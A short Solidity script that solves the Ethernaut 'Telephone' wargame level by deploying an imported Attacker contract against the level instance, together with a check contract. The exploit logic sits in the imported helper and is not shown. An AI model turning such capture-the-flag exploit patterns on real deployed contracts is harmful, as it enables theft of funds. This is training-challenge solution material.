// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Telephone} from "ethernaut/levels/Telephone.sol";
import {Attacker} from "~/helpers/Telephone.sol";

contract Check is CheckScript("TELEPHONE") {}

contract Solve is SolveScript("TELEPHONE") {
    Telephone target;

    constructor() {
        target = Telephone(instance);
    }

    function attack() public override {
        new Attacker(target);
    }
}
